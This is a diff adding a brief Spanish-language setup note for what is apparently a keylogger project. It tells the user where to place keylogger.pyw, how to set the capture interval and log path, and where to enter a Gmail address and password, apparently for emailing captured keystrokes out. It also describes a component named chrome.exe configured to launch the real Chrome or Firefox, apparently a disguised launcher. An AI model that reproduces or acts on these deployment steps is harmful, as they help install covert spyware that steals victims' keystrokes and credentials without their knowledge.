@@ -1,0 +1,12 @@
+    1.keylogger.pyw copiarlo en la carpeta deseada
+      -cambiar linea 4 para los minutos en segundos.
+      -cambiar linea 6 para la direccion del log.
+      -linea 42 email pass gmail
+
+      chrome.exe
+      -editar linea 3
+      -editar linea 6 con direccion de chrome o firefox
+      -editar linea 7 con exe de chrome o firefox
+
+Requisitos
+pip install pypiwin32
